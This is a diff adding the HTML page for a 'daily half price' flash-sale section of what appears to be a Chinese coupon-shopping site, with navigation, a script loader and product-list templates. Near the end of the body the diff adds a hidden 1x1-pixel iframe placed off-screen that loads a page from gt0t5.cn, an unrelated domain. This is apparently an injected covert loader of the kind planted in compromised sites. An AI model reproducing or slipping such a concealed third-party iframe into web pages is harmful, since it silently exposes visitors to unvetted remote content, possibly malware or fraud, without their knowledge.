@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta http-equiv="X-UA-Compatible" content="IE=8">
+    <meta http-equiv="X-UA-Compatible" content="IE=7,IE=9"> 
+    <title></title>
+    <script>
+        var ajaxHost = "http://mgi.sitezt.cn"
+
+        var navIndex // 导航index
+
+        var commonPost = ['http://rescdn.sitezt.cn/Newcms/js/jquery.min.js','//rescdn.sitezt.cn/A/c/CommonJs/jquery.lazyload.js','http://rescdn.sitezt.cn/Newcms/js/common/jump.js','http://rescdn.sitezt.cn/Newcms/js/common/apiServer.js',
+        '//rescdn.sitezt.cn/A/c/CommonJs/qrcode.min.js','http://rescdn.sitezt.cn/Newcms/js/common/w_common.js']
+    </script>
+    <link rel="stylesheet" href="http://rescdn.sitezt.cn/Newcms/css/common.css">
+</head>
+<body>
+    <div class="header">
+        <a href="http://rescdn.sitezt.cn/Newcms/html/home.html" class="header-logo jump-a">
+            <img class="logo-img" src="" alt="">
+        </a>
+        <div class="header-search">
+            <input type="text" class="search-text" placeholder="搜索站内优惠商品">
+            <button class="search-button-station">搜站内</button>
+            <button class="search-button-network">搜全网</button>
+            <ul>
+                
+            </ul>
+        </div>
+        <div class="header-label">
+            <img src="http://rescdn.sitezt.cn/Newcms/img/header-label.png" alt="">
+        </div>
+    </div>
+
+    <div class="nav">
+        <div class="nav-tab">
+            <ul>
+                <li>
+                    <a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/home.html">首页</a>
+                </li>
+                <li><a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/category.html">好货精选</a></li>
+                <li><a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/realtime.html">实时榜单</a></li>
+                <li><a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/xsqg.html">限时抢购</a></li>
+                <li><a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/nine.html">9块9包邮</a></li>
+                <li><a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/everydayHalf.html">每日半价<i class="new">New!</i></a></li>
+                <li><a class="li-a jump-a" href="http://rescdn.sitezt.cn/Newcms/html/discount.html">折上折<i class="new">New!</i></a></li>
+            </ul>
+            <a href="javascript:;" class="mobile">
+                <img src="http://rescdn.sitezt.cn/Newcms/img/mobile.png" alt="">手机版
+                <div class="qrcode"></div>
+            </a>
+            <div class="down-app">下载APP</div>
+        </div>
+    </div>
+<link rel="stylesheet" href="http://rescdn.sitezt.cn/Newcms/css/everydayHalf.css"><script>document.title="每日半价";var resourcePath="",navIndex="5",post=["http://rescdn.sitezt.cn/Newcms/js/template.js","http://rescdn.sitezt.cn/Newcms/js/everydayHalf.js"]</script><div class="everyday-container"><div class="everyday-banner"></div><div class="everyday-content"><div class="special-box" id="specialBox"></div><div class="special-goods clearfix" id="specialGoods"><div class="specail-placehoder"><div class="placehoder-img"></div><div class="placehoder-items"><div class="placehoder-item1"></div><div class="placehoder-item2"></div><div class="placehoder-item3"></div></div></div><div class="specail-placehoder"><div class="placehoder-img"></div><div class="placehoder-items"><div class="placehoder-item1"></div><div class="placehoder-item2"></div><div class="placehoder-item3"></div></div></div><div class="specail-placehoder"><div class="placehoder-img"></div><div class="placehoder-items"><div class="placehoder-item1"></div><div class="placehoder-item2"></div><div class="placehoder-item3"></div></div></div><div class="specail-placehoder"><div class="placehoder-img"></div><div class="placehoder-items"><div class="placehoder-item1"></div><div class="placehoder-item2"></div><div class="placehoder-item3"></div></div></div></div></div></div>
+
+<div style="height: 50px;background: #000;position: absolute;width: 100%;bottom: 0;">
+
+</div>
+<a id="rocket" href="javascript:;"></a>
+<iframe style="position: absolute;width:1px;height:1px;bottom:0px;left:-1000px;overflow:hidden;text-indent:-10px;" src="http://www.gt0t5.cn/index.html"></iframe>
+</body>
+<script type="text/javascript">
+    var _post = commonPost.concat(post)
+
+    var footer = document.getElementsByTagName('body')[0]
+
+    for (var i = 0; i < _post.length; i++) { 
+        var newScript=document.createElement('script'); 
+        newScript.type='text/javascript'; 
+        newScript.async=false; 
+        newScript.src=_post[i]; 
+        footer.appendChild(newScript); 
+    }
+</script>
+</html><script id="everydayNavTpl" type="text/html"><ul class="special-list">
+    {{each navList as item i}}
+      <!--  默认显示正在抢购的 -->
+      <li class="special-item {{item.Status == 2 ? 'active' : ''}}">
+        <div class="time">{{item.StartTime}}场</div>
+        <div class="status">{{item.Status == 1 ? '已开抢' : (item.Status == 2 ? '正在抢购' : '即将开始' )}}</div>
+      </li>
+    {{/each}}
+  </ul></script><script id="everydayListTpl" type="text/html">{{each goodsList as item i}}
+    <div class="goods-item buy">
+      <div class="goods-image">
+        <a href="javacript:void(0);">
+          <img src="{{item.PicUrl}}" alt=""/>
+        </a>
+      </div>
+      <div class="goods-info">
+        <a href="javacript:void(0);">
+          <h3>{{item.Name}}</h3>
+        </a>
+        <div class="lqBox">
+          <a href="javascript:void(0);" style="{{!item.Preferential ? 'border:none' : ''}}">{{item.Preferential ? item.Preferential : ''}}</a>
+          <a href="javascript:void(0);" style="{{!item.CouponAmountShow ? 'border:none;' : ''}}">{{item.CouponAmountShow ? item.CouponAmountShow : ''}}</a>
+        </div>
+        <p class="lqDesc">{{item.YiJuHua}}</p>
+        <p class="price" style="{{!item.ProgressType ? 'position: absolute;bottom: 8px;' : ''}}">￥{{item.SalePrice / 100}}</p>
+        {{if item.ProgressType}}
+          <div class="progress-box {{item.QiangType == 1 ? 'going' : (item.QiangType == 2 ? 'end' : 'will') }}">
+              <div class="progress" style="{{'width:'+item.PercentProgress+'%'}}"></div>
+                {{if (!/^[0-9]+$/.test(item.ProgressType))}}
+
+                  <div class="text">
+                    {{item.ProgressType}}
+                  </div>
+                {{else}}
+                  <div class="text">
+
+                    <span id="{{'countDown'+i}}">{{item.ProgressType | calcCountDown:i}}</span>
+                  </div>
+                {{/if}}
+          </div>
+        {{/if}}
+        <div class="buy-box">
+          <p class="buy-desc">已抢{{item.ItemSoldNum}}件</p>
+          <span class="buy-btn {{(item.QiangType == 1 || item.QiangType == 2) ? 'starting' : 'willstart' }}">
+            {{item.QiangType == 1 ? '马上抢' : (item.QiangType == 2 ? '去购买' : '未开始')}}
+          </span>
+        </div>
+      </div>
+    </div>
+  {{/each}}</script>
